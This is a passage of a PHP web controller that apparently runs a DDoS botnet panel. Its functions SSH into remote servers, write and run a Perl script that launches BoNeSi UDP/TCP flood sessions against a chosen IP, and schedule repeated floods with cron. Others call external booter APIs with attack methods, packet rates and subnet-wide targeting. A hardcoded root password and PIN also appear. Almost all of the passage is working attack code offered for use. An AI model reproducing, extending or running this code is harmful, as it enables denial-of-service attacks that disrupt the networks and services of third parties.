            $traffic_info = "rx: {$rx_rate} ({$rx_packets} packets/s) & tx: {$tx_rate} ({$tx_packets} packets/s)";
            
            echo json_encode(['status' => 'success', 'traffic' => $traffic_info]);
        } catch (Exception $e) {
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        }
    }

    public function start_session_all() 
    {
        if ($this->input->server('REQUEST_METHOD') === 'POST') {
            $ip = $this->input->post('ip');
            $duration = $this->input->post('duration');
            $pin = $this->input->post('pin');
            
            // Input validation
            if (!$ip || !$duration || !$pin) {
                echo json_encode(['status' => 'error', 'message' => 'Missing required parameters']);
                return;
            }

            // Validate IP format
            if (!filter_var($ip, FILTER_VALIDATE_IP)) {
                echo json_encode(['status' => 'error', 'message' => 'Invalid IP address format']);
                return;
            }

            // Validate duration
            $duration = intval($duration);
            if ($duration < 1 || $duration > 3600) {
                echo json_encode(['status' => 'error', 'message' => 'Duration must be between 1 and 3600 seconds']);
                return;
            }

            // Get server information
            $file_path = FCPATH . 'server_config/servers.json';
            if (!file_exists($file_path)) {
                echo json_encode(['status' => 'error', 'message' => 'Server configuration not found']);
                return;
            }

            $servers = json_decode(file_get_contents($file_path), true);
            $results = [];

            foreach ($servers as $server_name => $server_info) {
                // Verify PIN for each server
                if ($server_info['pin'] !== $pin) {
                    $results[$server_name] = ['status' => 'error', 'message' => 'Invalid PIN'];
                    continue;
                }

                try {
                    // First check if target2.pl exists
                    $check_script = "test -f /home/botnet/target2.pl && echo 'exists'";
                    $script_exists = trim($this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $check_script
                    ));

                    // If script doesn't exist, create it
                    if ($script_exists !== 'exists') {
                        // Create directory if it doesn't exist
                        $this->execute_remote_command(
                            $server_info['ip'],
                            $server_info['user'],
                            $server_info['password'],
                            "sudo mkdir -p /home/botnet"
                        );

                        // Create the Perl script
                        $perl_script = <<<'EOT'
#!/usr/bin/perl

use strict;
use warnings;
use Getopt::Long;
use Time::HiRes qw(sleep);

# Read command-line arguments
my ($target_ip, $num_sessions, $protocol, $duration);
GetOptions(
    'target_ip=s'    => \$target_ip,
    'num_sessions=i' => \$num_sessions,
    'protocol=s'     => \$protocol,
    'duration=i'     => \$duration
);

unless ($target_ip && $num_sessions && $protocol && $duration) {
    die "Usage: $0 --target_ip=<TARGET_IP> --num_sessions=<NUM_SESSIONS> --protocol=<PROTOCOL> --duration=<DURATION_IN_SECONDS>\\n";
}

# Validate protocol
unless ($protocol eq 'UDP' || $protocol eq 'TCP') {
    die "Invalid protocol specified: $protocol. Use 'UDP' or 'TCP'.\\n";
}

# Function to generate a random port between 1024 and 65535
sub random_port {
    return int(rand(64512)) + 1024;
}

# Starting BoNeSi sessions
for (my $i = 1; $i <= $num_sessions; $i++) {
    my $port = random_port();
    my $cmd;

    if ($protocol eq 'UDP') {
        $cmd = "sudo nohup bonesi -i /home/botnet/trans_dns1.csv $target_ip:$port -p udp -s 1400 > /dev/null 2>&1 &";
    } elsif ($protocol eq 'TCP') {
        $cmd = "sudo nohup bonesi -i /home/botnet/trans_dns1.csv $target_ip:$port -p tcp -d ens160 -s 1450 > /dev/null 2>&1 &";
    }

    system($cmd);
    print "Started $protocol BoNeSi session $i targeting IP $target_ip on port $port\\n";
    sleep 3;
}

print "All BoNeSi sessions started. They will be terminated after $duration seconds.\\n";
EOT;

                        // Create script and set permissions
                        $setup_commands = [
                            "echo '" . str_replace("'", "'\"'\"'", $perl_script) . "' | tr -d '\\r' | sudo tee /home/botnet/target2.pl > /dev/null",
                            "sudo chown root:root /home/botnet/target2.pl",
                            "sudo chmod 755 /home/botnet/target2.pl"
                        ];

                        foreach ($setup_commands as $cmd) {
                            $this->execute_remote_command(
                                $server_info['ip'],
                                $server_info['user'],
                                $server_info['password'],
                                $cmd
                            );
                        }
                    }

                    // Now start the bonesi session
                    $command = "cd /home/botnet && sudo perl target2.pl " . 
                              "--target_ip={$ip} " .
                              "--num_sessions=1 " .
                              "--protocol=UDP " .
                              "--duration={$duration}";

                    $output = $this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $command
                    );

                    $results[$server_name] = [
                        'status' => 'success',
                        'message' => "Session started successfully"
                    ];
                } catch (Exception $e) {
                    $results[$server_name] = [
                        'status' => 'error',
                        'message' => $e->getMessage()
                    ];
                }
            }

            echo json_encode([
                'status' => 'success',
                'results' => $results
            ]);
            return;
        }

        // GET request - show the form
        $file_path = FCPATH . 'server_config/servers.json';
        $data['servers'] = [];
        
        if (file_exists($file_path)) {
            $servers = json_decode(file_get_contents($file_path), true);
            if (is_array($servers)) {
                $data['servers'] = $servers;
            }
        }
        
        $this->load->view('Other/start_session_all', $data);
    }

    public function schedule_cron() 
    {
        try {
            // Get input parameters
            $ip = $this->input->post('ip');
            $duration = $this->input->post('duration');
            $schedule_type = $this->input->post('schedule_type');
            $start_time = $this->input->post('start_time');
            $custom_interval = $this->input->post('custom_interval');
            $pin = $this->input->post('pin');

            // Debug logging
            log_message('debug', 'API Cron Schedule Request - IP: ' . $ip . 
                ', Duration: ' . $duration . 
                ', Type: ' . $schedule_type . 
                ', Start Time: ' . $start_time);

            // Validate inputs
            if (!$ip || !$duration || !$schedule_type || !$start_time || !$pin) {
                echo json_encode(['status' => 'error', 'message' => 'Missing required parameters']);
                return;
            }

            if ($pin !== '654321') {
                echo json_encode(['status' => 'error', 'message' => 'Invalid PIN']);
                return;
            }

            // Get server information
            $file_path = FCPATH . 'server_config/servers.json';
            if (!file_exists($file_path)) {
                echo json_encode(['status' => 'error', 'message' => 'Server configuration not found']);
                return;
            }

            $servers = json_decode(file_get_contents($file_path), true);
            $results = [];
            $schedule_id = uniqid();

            foreach ($servers as $server_name => $server_info) {
                try {
                    if ($server_info['pin'] !== $pin) {
                        $results[$server_name] = ['status' => 'error', 'message' => 'Invalid PIN'];
                        continue;
                    }

                    // Generate cron schedule based on type
                    $cron_schedule = '';
                    $time_parts = explode(':', $start_time);
                    $hour = intval($time_parts[0]);
                    $minute = intval($time_parts[1]);

                    switch ($schedule_type) {
                        case 'hourly':
                            $cron_schedule = "$minute * * * *";
                            break;
                        case 'daily':
                            $cron_schedule = "$minute $hour * * *";
                            break;
                        case 'custom':
                            if (!$custom_interval || !is_numeric($custom_interval)) {
                                $results[$server_name] = ['status' => 'error', 'message' => 'Invalid custom interval'];
                                continue;
                            }
                            $cron_schedule = "*/$custom_interval * * * *";
                            break;
                        default:
                            $results[$server_name] = ['status' => 'error', 'message' => 'Invalid schedule type'];
                            continue;
                    }

                    // Create start and stop commands
                    $start_command = "cd /home/botnet && sudo perl target2.pl --target_ip=$ip --num_sessions=1 --protocol=UDP --duration=$duration";
                    $stop_command = "ps aux | grep 'bonesi.*$ip' | grep -v grep | awk '{print \$2}' | xargs -r sudo kill";

                    // Create cron entries
                    $cron_start = "$cron_schedule $start_command 2>&1 | logger -t bonesi_cron_$schedule_id\n";
                    
                    // Calculate stop time and add stop entry
                    $duration_minutes = ceil($duration / 60);
                    $stop_minute = ($minute + $duration_minutes) % 60;
                    $stop_hour = $hour + floor(($minute + $duration_minutes) / 60);
                    $stop_schedule = "$stop_minute $stop_hour * * *";
                    $cron_stop = "$stop_schedule $stop_command 2>&1 | logger -t bonesi_cron_$schedule_id\n";

                    // Add to crontab
                    $temp_file = "/tmp/crontab_$schedule_id";
                    $command = "crontab -l > $temp_file 2>/dev/null || true\n";
                    $command .= "echo '$cron_start' >> $temp_file\n";
                    $command .= "echo '$cron_stop' >> $temp_file\n";
                    $command .= "crontab $temp_file\n";
                    $command .= "rm $temp_file";

                    $this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $command
                    );

                    $results[$server_name] = [
                        'status' => 'success',
                        'message' => 'Cron jobs scheduled successfully',
                        'schedule_id' => $schedule_id
                    ];

                } catch (Exception $e) {
                    $results[$server_name] = [
                        'status' => 'error',
                        'message' => $e->getMessage()
                    ];
                }
            }

            echo json_encode([
                'status' => 'success',
                'results' => $results
            ]);

            // Log success
            log_message('debug', 'API Cron Schedule Success - ID: ' . $schedule_id);

        } catch (Exception $e) {
            log_message('error', 'API Cron Schedule Error: ' . $e->getMessage());
            echo json_encode([
                'status' => 'error',
                'message' => $e->getMessage()
            ]);
        }
    }

    public function delete_cron() 
    {
        $job_id = $this->input->post('job_id');
        $pin = $this->input->post('pin');

        if (!$job_id || !$pin) {
            echo json_encode(['status' => 'error', 'message' => 'Missing required parameters']);
            return;
        }

        // Get server information
        $file_path = FCPATH . 'server_config/servers.json';
        if (!file_exists($file_path)) {
            echo json_encode(['status' => 'error', 'message' => 'Server configuration not found']);
            return;
        }

        $servers = json_decode(file_get_contents($file_path), true);
        $results = [];

        foreach ($servers as $server_name => $server_info) {
            try {
                if ($server_info['pin'] !== $pin) {
                    $results[$server_name] = ['status' => 'error', 'message' => 'Invalid PIN'];
                    continue;
                }

                // Remove cron entries containing the job_id
                $command = "(crontab -l | grep -v 'bonesi_cron_$job_id') | crontab -";
                $this->execute_remote_command(
                    $server_info['ip'],
                    $server_info['user'],
                    $server_info['password'],
                    $command
                );

                $results[$server_name] = [
                    'status' => 'success',
                    'message' => 'Cron jobs removed successfully'
                ];

            } catch (Exception $e) {
                $results[$server_name] = [
                    'status' => 'error',
                    'message' => $e->getMessage()
                ];
            }
        }

        echo json_encode([
            'status' => 'success',
            'results' => $results
        ]);
    }

    public function get_cron_list() 
    {
        try {
            // Get server information
            $file_path = FCPATH . 'server_config/servers.json';
            if (!file_exists($file_path)) {
                log_message('debug', 'Server config file not found: ' . $file_path);
                return $this->json_response(['status' => 'success', 'cron_jobs' => []]);
            }

            $servers = json_decode(file_get_contents($file_path), true);
            if (!is_array($servers)) {
                log_message('debug', 'Invalid server configuration format');
                return $this->json_response(['status' => 'success', 'cron_jobs' => []]);
            }

            $all_cron_jobs = [];

            foreach ($servers as $server_name => $server_info) {
                try {
                    // Use a more reliable command to get crontab entries
                    $command = "crontab -l 2>/dev/null || echo ''";
                    $output = $this->execute_remote_command(
                        $server_info['ip'],
                        $server_info['user'],
                        $server_info['password'],
                        $command
                    );

                    log_message('debug', "Crontab output for $server_name: " . print_r($output, true));

                    if ($output) {
                        $lines = explode("\n", $output);
                        foreach ($lines as $line) {
                            $line = trim($line);
                            if (empty($line)) continue;

                            // Only process bonesi start jobs
                            if (strpos($line, 'target2.pl') !== false && strpos($line, '--target_ip') !== false) {
                                // Get cron schedule part (first 5 fields)
                                $parts = preg_split('/\s+/', $line, 6);
                                $schedule = implode(' ', array_slice($parts, 0, 5));

                                // Extract job information using safer regex patterns
                                $id = '';
                                $ip = '';
                                $duration = '0';

                                // Extract ID
                                if (preg_match('/bonesi_cron_([a-f0-9]+)/', $line, $matches)) {
                                    $id = $matches[1];
                                }

                                // Extract IP
                                if (preg_match('/--target_ip=([0-9.]+)/', $line, $matches)) {
                                    $ip = $matches[1];
                                }

                                // Extract duration
                                if (preg_match('/--duration=(\d+)/', $line, $matches)) {
                                    $duration = $matches[1];
                                }

                                if ($id && $ip) {
                                    $all_cron_jobs[] = [
                                        'id' => $id,
                                        'server' => $server_name,
                                        'ip' => $ip,
                                        'schedule' => $schedule,
                                        'duration' => $duration,
                                        'next_run' => 'Scheduled'
                                    ];
                                }
                            }
                        }
                    }
                } catch (Exception $e) {
                    log_message('error', "Error getting cron jobs from $server_name: " . $e->getMessage());
                }
            }

            log_message('debug', 'Final cron jobs array: ' . print_r($all_cron_jobs, true));

            return $this->json_response([
                'status' => 'success',
                'cron_jobs' => $all_cron_jobs
            ]);

        } catch (Exception $e) {
            log_message('error', "Error in get_cron_list: " . $e->getMessage());
            return $this->json_response([
                'status' => 'error',
                'message' => 'Failed to retrieve cron jobs: ' . $e->getMessage()
            ], 500);
        }
    }

    private function calculate_next_run($cron_schedule) 
    {
        try {
            $parts = preg_split('/\s+/', trim($cron_schedule));
            if (count($parts) === 5) {
                list($minute, $hour, $day, $month, $weekday) = $parts;
                
                $now = new DateTime();
                $next = clone $now;
                
                if (strpos($minute, '*/') !== false) {
                    // For */n format
                    $interval = (int)substr($minute, 2);
                    $current_minute = (int)$now->format('i');
                    $minutes_to_add = $interval - ($current_minute % $interval);
                    if ($minutes_to_add === 0) $minutes_to_add = $interval;
                    $next->modify("+$minutes_to_add minutes");
                } else if (is_numeric($minute)) {
                    // For specific minute
                    $next->setTime($hour, $minute);
                    if ($next <= $now) {
                        $next->modify('+1 day');
                    }
                }
                
                return $next->format('Y-m-d H:i:s');
            }
        } catch (Exception $e) {
            error_log("Error calculating next run time: " . $e->getMessage());
        }
        
        return 'Schedule pending';
    }

    // Helper function to handle JSON responses
    private function json_response($data, $status_code = 200) {
        header('Content-Type: application/json');
        http_response_code($status_code);
        echo json_encode($data, JSON_PRETTY_PRINT);
        exit;
    }

    // Function to show the API sessions view
    public function start_session_api()
    {
        $data['default_port'] = '80'; // Default port value
        $this->load->view('Other/start_session_api', $data);
    }

    // Function to handle immediate API session start
    public function start_session_api_now()
    {
        try {
            $ip = $this->input->post('ip');
            $duration = $this->input->post('duration');
            $pin = $this->input->post('pin');
            
            // Add port parameter
            $port_input = trim($this->input->post('port'));
            $port = '80'; // Default port
            if ($port_input !== '' && $port_input !== null && $port_input !== false) {
                $port = $port_input;
            }

            // Validate inputs
            if (!$ip || !$duration || !$pin) {
                echo json_encode(['status' => 'error', 'message' => 'Missing required parameters']);
                return;
            }

            if ($pin !== '654321') {
                echo json_encode(['status' => 'error', 'message' => 'Invalid PIN']);
                return;
            }

            // Get API configurations
            $file_path = FCPATH . 'server_config/servers_api.json';
            if (!file_exists($file_path)) {
                echo json_encode(['status' => 'error', 'message' => 'API configuration not found']);
                return;
            }

            $api_servers = json_decode(file_get_contents($file_path), true);
            $results = [];
            $session_ids = [];

            foreach ($api_servers as $api_name => $api_info) {
                try {
                    // Use API-specific port if provided, otherwise use the input port
                    $target_port = ($api_info['port'] !== '?') ? $api_info['port'] : $port;

                    // Check if the last octet of IP is 0 for subnet mode
                    $ip_parts = explode('.', $ip);
                    $subnet_mode = $api_info['subnet_mode']; // Default from config

                    // If last octet is 0, override subnet_mode to true
                    if (count($ip_parts) === 4 && $ip_parts[3] === '0') {
                        $subnet_mode = "true";
                        log_message('debug', 'Subnet mode enabled for IP ending with .0: ' . $ip);
                    }

                    $api_url = $api_info['url'] . http_build_query([
                        'type' => $api_info['type'],
                        'apikey' => $api_info['apikey'],
                        'host' => $ip,
                        'port' => $target_port,
                        'time' => $duration,
                        'method' => $api_info['method'],
                        'pps' => $api_info['pps'],
                        'subnet_mode' => $subnet_mode, // Use our modified value
                        'concurrents' => $api_info['concurrents']
                    ]);

                    // Log the final URL (optional)
                    log_message('debug', 'API URL with subnet mode: ' . $api_url);

                    // Execute API call
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $api_url);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    $response = curl_exec($ch);
                    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    curl_close($ch);

                    if ($http_code == 200) {
                        // Add to running sessions only if API call was successful
                        $session_id = $this->add_running_session($ip, $target_port, $duration, $api_name, $api_info['method']);
                        $session_ids[] = $session_id;
                    }

                    $results[$api_name] = [
                        'status' => ($http_code == 200) ? 'success' : 'error',
                        'message' => $response,
                        'session_id' => ($http_code == 200) ? $session_id : null
                    ];

                } catch (Exception $e) {
                    $results[$api_name] = [
                        'status' => 'error',
                        'message' => $e->getMessage()
                    ];
                }
            }

            echo json_encode([
                'status' => 'success',
                'results' => $results,
                'session_ids' => $session_ids
            ]);

        } catch (Exception $e) {
            echo json_encode([
                'status' => 'error',
                'message' => $e->getMessage()
            ]);
        }
    }

    // Function to schedule API cron jobs
    public function schedule_api_cron()
    {
        try {
            // Get input parameters
            $ip = $this->input->post('ip');
            
            // Handle port with older PHP compatibility
            $port_input = trim($this->input->post('port'));
            $port = '80'; // Default port
            if ($port_input !== '' && $port_input !== null && $port_input !== false) {
                $port = $port_input;
            }
            
            $duration = $this->input->post('duration');
            $schedule_type = $this->input->post('schedule_type');
            $start_time = $this->input->post('start_time');
            $custom_interval = $this->input->post('custom_interval');
            $pin = $this->input->post('pin');

            // Validate inputs
            if (!$ip || !$duration || !$schedule_type || !$pin) {
                echo json_encode(['status' => 'error', 'message' => 'Missing required parameters']);
                return;
            }

            if ($pin !== '654321') {
                echo json_encode(['status' => 'error', 'message' => 'Invalid PIN']);
                return;
            }

            // Log the cron schedule request
            log_message('debug', 'API Cron Schedule Request - IP: ' . $ip . ', Port: ' . $port . ', Duration: ' . $duration . ', Type: ' . $schedule_type . ', Start Time: ' . $start_time);

            // Generate cron schedule
            $time_parts = explode(':', $start_time);
            $hour = isset($time_parts[0]) ? intval($time_parts[0]) : 0;
            $minute = isset($time_parts[1]) ? intval($time_parts[1]) : 0;

            switch ($schedule_type) {
                case 'hourly':
                    $cron_schedule = "$minute * * * *";
                    break;
                case 'daily':
                    $cron_schedule = "$minute $hour * * *";
                    break;
                case 'custom':
                    if (!$custom_interval || !is_numeric($custom_interval)) {
                        echo json_encode(['status' => 'error', 'message' => 'Invalid custom interval']);
                        return;
                    }
                    $cron_schedule = "*/$custom_interval * * * *";
                    break;
                default:
                    echo json_encode(['status' => 'error', 'message' => 'Invalid schedule type']);
                    return;
            }

            // Get API configurations
            $file_path = FCPATH . 'server_config/servers_api.json';
            if (!file_exists($file_path)) {
                echo json_encode(['status' => 'error', 'message' => 'API configuration not found']);
                return;
            }

            $api_servers = json_decode(file_get_contents($file_path), true);
            //$cron = new Crontab();
            $cron_entries = "";
            $schedule_id = uniqid('api_', true);
            
            foreach ($api_servers as $api_name => $api_info) {
                // Check if the last octet of IP is 0 for subnet mode
                $ip_parts = explode('.', $ip);
                $subnet_mode = $api_info['subnet_mode']; // Default from config

                // If last octet is 0, override subnet_mode to true
                if (count($ip_parts) === 4 && $ip_parts[3] === '0') {
                    $subnet_mode = "true";
                    log_message('debug', 'Subnet mode enabled for IP ending with .0: ' . $ip);
                }
                
                // Use API-specific port if provided, otherwise use the input port
                $target_port = ($api_info['port'] !== '?') ? $api_info['port'] : $port;
                
                // Build the API URL with proper subnet_mode
                $api_url = $api_info['url'] . http_build_query([
                    'type' => $api_info['type'],
                    'apikey' => $api_info['apikey'],
                    'host' => $ip,
                    'port' => $target_port,
                    'time' => $duration,
                    'method' => $api_info['method'],
                    'pps' => $api_info['pps'],
                    'subnet_mode' => $subnet_mode, // Use our modified value
                    'concurrents' => $api_info['concurrents']
                ]);
                
                // Log the final URL for debugging
                log_message('debug', 'API Cron URL with subnet mode: ' . $api_url);

                // Escape single quotes in URL for shell command
                $api_url = str_replace("'", "'\\''", $api_url);
                $curl_command = "curl -s '$api_url'";

                // Add API name in the logger tag for better identification
                $cron_entries .= "$cron_schedule $curl_command 2>&1 | logger -t api_cron_{$api_name}_{$schedule_id}\n";
                
                // Log each API entry for debugging
                log_message('debug', "Added cron entry for $api_name: $cron_schedule $curl_command");
            }

            // Continue with the rest of the function...

            // Log total cron entries
            log_message('debug', 'Total cron entries to be added: ' . $cron_entries);

            if (empty($cron_entries)) {
                throw new Exception("No valid API configurations found");
            }

            // First, get current crontab
            $current_crontab = $this->execute_remote_command(
                '127.0.0.1',
                'root',
                'MyPakistan@007',
                'crontab -l'
            );

            if ($current_crontab === false) {
                $current_crontab = '';
            }

            // Combine current crontab with new entries
            $new_crontab = $current_crontab . "\n" . $cron_entries;

            // Create a temporary file with the new crontab content
            $temp_file = "/tmp/crontab_api_$schedule_id";
            
            // Write to temp file and install new crontab
            $commands = [
                "echo '" . str_replace("'", "'\\''", $new_crontab) . "' > $temp_file",
                "crontab $temp_file",
                "rm -f $temp_file"
            ];

            // Execute each command
            foreach ($commands as $cmd) {
                $result = $this->execute_remote_command(
                    '127.0.0.1',
                    'root',
                    'MyPakistan@007',
                    $cmd
                );

                if ($result === false) {
                    throw new Exception("Failed to execute command: $cmd");
                }
            }

            // Verify the crontab was updated - with more detailed error handling
            $verify = $this->execute_remote_command(
                '127.0.0.1',
                'root',
                'MyPakistan@007',
                'crontab -l'
            );

            if ($verify === false) {
                throw new Exception("Failed to read crontab after update");
            }

            // Log the verification attempt
            log_message('debug', 'Verifying crontab update. Current crontab: ' . $verify);
            log_message('debug', 'Looking for schedule ID: ' . $schedule_id);

            // More lenient verification - check if any of the API entries were added
            $verification_passed = false;
            foreach ($api_servers as $api_name => $api_info) {
                if (strpos($verify, "api_cron_{$api_name}_{$schedule_id}") !== false) {
                    $verification_passed = true;
                    break;
                }
            }

            if (!$verification_passed) {
                log_message('error', 'Crontab verification failed. Current crontab: ' . $verify);
                throw new Exception("Failed to verify crontab update. Please check the cron jobs manually.");
            }

            echo json_encode([
                'status' => 'success',
                'message' => 'API cron jobs scheduled successfully',
                'schedule_id' => $schedule_id
            ]);

            // Log success
            log_message('debug', 'API Cron Schedule Success - ID: ' . $schedule_id);

        } catch (Exception $e) {
            log_message('error', 'API Cron Schedule Error: ' . $e->getMessage());
            echo json_encode([
                'status' => 'error',
                'message' => $e->getMessage()
            ]);
        }
    }

    // Function to get list of API cron jobs
    public function get_api_cron_list()
    {
        try {
            $output = $this->execute_remote_command(
                '127.0.0.1',
                'root',
                'MyPakistan@007',
                'crontab -l'
            );

            if ($output === false) {
                throw new Exception("Failed to get crontab");
            }

            $cron_jobs = [];
            if ($output) {
                $lines = explode("\n", $output);
                foreach ($lines as $line) {
                    if (strpos($line, 'api_cron_') !== false) {
                        // Extract schedule and other details
                        $parts = preg_split('/\s+/', $line, 6);
                        $schedule = implode(' ', array_slice($parts, 0, 5));
                        
                        // Extract job ID and API name
                        preg_match('/api_cron_(API-[12])_([a-f0-9]+)/', $line, $id_matches);
                        
                        // Extract IP from URL
                        preg_match('/host=([^&]+)/', $line, $ip_matches);
                        
                        // Extract duration from URL
                        preg_match('/time=(\d+)/', $line, $duration_matches);
                        
                        // Extract method from URL
                        preg_match('/method=([^&]+)/', $line, $method_matches);

                        if (!empty($id_matches[2]) && !empty($ip_matches[1])) {
                            $duration = isset($duration_matches[1]) ? $duration_matches[1] : '0';
                            $api_name = isset($id_matches[1]) ? $id_matches[1] : 'API Server';
                            $method = isset($method_matches[1]) ? $method_matches[1] : 'Unknown';
                            
                            $cron_jobs[] = [
                                'id' => $id_matches[2],
                                'api_name' => $api_name,
                                'ip' => $ip_matches[1],
                                'schedule' => $schedule,
                                'duration' => $duration,
                                'method' => $method,
                                'next_run' => 'Scheduled'
                            ];
                        }
                    }
                }
            }

            echo json_encode([
                'status' => 'success',
                'cron_jobs' => $cron_jobs
            ]);

        } catch (Exception $e) {
            echo json_encode([
                'status' => 'error',
                'message' => $e->getMessage()
            ]);
        }
    }

    // Function to delete API cron job
    public function delete_api_cron()
    {
        try {
            $job_id = $this->input->post('job_id');
            $pin = $this->input->post('pin');

            if (!$job_id || !$pin) {
                echo json_encode(['status' => 'error', 'message' => 'Missing required parameters']);
                return;
            }

            if ($pin !== '654321') {
                echo json_encode(['status' => 'error', 'message' => 'Invalid PIN']);
                return;
            }

            // Get current crontab
            $current_crontab = $this->execute_remote_command(
                '127.0.0.1',
                'root',
                'MyPakistan@007',
                'crontab -l'
            );

            if ($current_crontab === false) {
                throw new Exception("Failed to read current crontab");
            }

            // Split into lines and filter out the matching jobs
            $lines = explode("\n", $current_crontab);
            $new_crontab = [];
            $found_job = false;
            
            foreach ($lines as $line) {
                $trimmed_line = trim($line);
                if ($trimmed_line === '') continue;
                
                // Check for the specific job ID pattern
                if (strpos($trimmed_line, "api_cron_") !== false && strpos($trimmed_line, $job_id) !== false) {
                    $found_job = true;
                    continue; // Skip this line to remove it from crontab
                }
                
                $new_crontab[] = $line;
            }

            if (!$found_job) {
                echo json_encode(['status' => 'error', 'message' => 'Cron job not found']);
                return;
            }

            // Create new crontab content
            $new_crontab_content = implode("\n", array_filter($new_crontab)) . "\n";

            // Write new crontab using a more reliable method
            $temp_file = "/tmp/crontab_delete_" . uniqid();
            
            // Write to temp file
            $write_result = $this->execute_remote_command(
                '127.0.0.1',
                'root',
                'MyPakistan@007',
                "echo " . escapeshellarg($new_crontab_content) . " > " . escapeshellarg($temp_file)
            );

            if ($write_result === false) {
                throw new Exception("Failed to write new crontab content");
            }

            // Install new crontab
            $install_result = $this->execute_remote_command(
                '127.0.0.1',
                'root',
                'MyPakistan@007',
                "crontab " . escapeshellarg($temp_file)
            );

            if ($install_result === false) {
                throw new Exception("Failed to install new crontab");
            }

            // Clean up temp file
            $this->execute_remote_command(
                '127.0.0.1',
                'root',
                'MyPakistan@007',
                "rm -f " . escapeshellarg($temp_file)
            );

            // Verify deletion
            $verify = $this->execute_remote_command(
                '127.0.0.1',
                'root',
                'MyPakistan@007',
                'crontab -l'
            );

            // Double check if the job was actually removed
            if (strpos($verify, "api_cron_") !== false && strpos($verify, $job_id) !== false) {
                throw new Exception("Failed to remove cron job - job still exists in crontab");
            }

            echo json_encode([
                'status' => 'success',
                'message' => 'API cron job deleted successfully'
            ]);

        } catch (Exception $e) {
            log_message('error', 'Delete API Cron Error: ' . $e->getMessage());
            echo json_encode([
                'status' => 'error',
                'message' => $e->getMessage()
            ]);
        }
    }

    // Add these new functions to your controller

    private function add_running_session($ip, $port, $duration, $api_name, $method) {
        $file_path = FCPATH . 'server_config/servers_api_running.json';
        $current_time = time();
        $end_time = $current_time + $duration;
        
        // Create directory if it doesn't exist
        $dir_path = FCPATH . 'server_config';
        if (!file_exists($dir_path)) {
            mkdir($dir_path, 0755, true);
        }
        
        // Read existing sessions
        $sessions = [];
        if (file_exists($file_path)) {
            $content = file_get_contents($file_path);
            if ($content) {
                $sessions = json_decode($content, true) ?: [];
            }
        }
        
        // Clean expired sessions
        $sessions = array_filter($sessions, function($session) {
            return $session['end_time'] > time();
        });
        
        // Add new session
        $session_id = uniqid('ses_');
        $sessions[$session_id] = [
            'ip' => $ip,
            'port' => $port,
            'api_name' => $api_name,
            'method' => $method,
            'start_time' => $current_time,
            'end_time' => $end_time,
            'duration' => $duration
        ];
        
        // Save updated sessions
        file_put_contents($file_path, json_encode($sessions, JSON_PRETTY_PRINT));
        
        return $session_id;
    }

    public function get_running_sessions() {
        try {
            $file_path = FCPATH . 'server_config/servers_api_running.json';
            
            if (!file_exists($file_path)) {
                echo json_encode(['status' => 'success', 'sessions' => []]);
                return;
            }
            
            $content = file_get_contents($file_path);
            $sessions = json_decode($content, true) ?: [];
            
            // Clean expired sessions and format remaining ones
            $current_time = time();
            $active_sessions = [];
            
            foreach ($sessions as $id => $session) {
                if ($session['end_time'] > $current_time) {
                    $remaining_time = $session['end_time'] - $current_time;
                    $active_sessions[] = [
                        'id' => $id,
                        'ip' => $session['ip'],
                        'port' => $session['port'],
                        'api_name' => $session['api_name'],
                        'method' => $session['method'],
                        'remaining_time' => $remaining_time,
                        'duration' => $session['duration'],
                        'start_time' => date('Y-m-d H:i:s', $session['start_time']),
                        'end_time' => date('Y-m-d H:i:s', $session['end_time'])
                    ];
                }
            }
            
            // Save cleaned sessions back to file
            if (count($sessions) > count($active_sessions)) {
                $cleaned_sessions = [];
                foreach ($active_sessions as $session) {
                    $cleaned_sessions[$session['id']] = [
                        'ip' => $session['ip'],
                        'port' => $session['port'],
                        'api_name' => $session['api_name'],
                        'method' => $session['method'],
                        'start_time' => strtotime($session['start_time']),
                        'end_time' => strtotime($session['end_time']),
                        'duration' => $session['duration']
                    ];
                }
                file_put_contents($file_path, json_encode($cleaned_sessions, JSON_PRETTY_PRINT));
            }
            
            echo json_encode([
                'status' => 'success',
                'sessions' => $active_sessions
            ]);
            
        } catch (Exception $e) {
            echo json_encode([
                'status' => 'error',
                'message' => $e->getMessage()
            ]);
        }
    }

    /**
     * Delete a client application and any associated cron job
     */
    public function delete_client_app() {
        try {
            $device_name = $this->input->post('device_name');
            
            if (empty($device_name)) {
                echo json_encode(['status' => 'error', 'message' => 'Device name is required']);
                return;
            }

            // Path to the JSON file
            $file_path = FCPATH . 'server_config/client_apps.json';
            
            if (!file_exists($file_path)) {
                echo json_encode(['status' => 'error', 'message' => 'Client data file not found']);
                return;
            }

            // Read existing data
            $content = file_get_contents($file_path);
            $clients = json_decode($content, true) ?: [];
            
            // Check if device exists
            if (!isset($clients[$device_name])) {
                echo json_encode(['status' => 'error', 'message' => 'Device not found']);
                return;
            }
            
            // If this client has a cron job, remove it
            if (!empty($clients[$device_name]['cron_id'])) {
                $this->remove_client_cron_job($clients[$device_name]['cron_id']);
                log_message('debug', 'Removed cron job for client: ' . $device_name . ' with ID: ' . $clients[$device_name]['cron_id']);
            }

            // Remove the device
            unset($clients[$device_name]);

            // Save updated data
            file_put_contents($file_path, json_encode($clients, JSON_PRETTY_PRINT));

            echo json_encode(['status' => 'success', 'message' => 'Device removed successfully']);

        } catch (Exception $e) {
            log_message('error', 'Error deleting client: ' . $e->getMessage());
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        }
    }

    // Mobile ApplicationAdd these new functions to the controller
    // Create New Job for UDP Session

    public function start_udp_session()
    {
        try {
            $server = $this->input->post('server');
            $ip = $this->input->post('ip');
            $pin = $this->input->post('pin');
            $device_name = $this->input->post('device_name');

            if (!$server || !$ip || !$pin || !$device_name) {
                $missing = [];
                if (!$server) $missing[] = 'server';
                if (!$ip) $missing[] = 'ip';
                if (!$pin) $missing[] = 'pin';
                if (!$device_name) $missing[] = 'device_name';
                
                echo json_encode([
                    'status' => 'error',
                    'message' => 'Missing required parameters: ' . implode(', ', $missing)
                ]);
                return;
            }

            // Get server information
            $file_path = FCPATH . 'server_config/servers.json';
            if (!file_exists($file_path)) {
                echo json_encode(['status' => 'error', 'message' => 'Server configuration not found']);
                return;
            }
